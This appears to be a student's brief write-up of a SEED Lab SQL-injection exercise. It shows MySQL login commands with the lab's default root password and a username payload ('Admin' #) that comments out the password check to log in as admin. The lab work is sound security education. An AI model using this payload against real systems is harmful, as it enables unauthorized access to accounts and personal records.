# SQL-Injection
SQL-INJECTION
Title	Author	Date
SQL Injection Attack Seed Lab Ubunto 16.04	M.Umer Hassan	30-10-2021
Task 1
Login MYSQL:
mysql -u root -pseedubuntu
mysql> use Users;
mysql> show tables;
Use Such a SQL Query:
select * from credential where Name = 'Alice';

Screen shoot is in SQL Injection Folder
Task 2
Task 2.1
USERNAME: "Admin' #"
PASSWORD: "***" whatever the password was
It will result in a SQL Query as:
SELECT id, name, eid, salary, birth, ssn, address, email,
nickname, Password
FROM credential
WHERE name= 'Admin' #' and Password='***'

Then statement after # will bi regarded as comments. So we can login in as Admin.

Screen shoot is in SQL Injection Folder
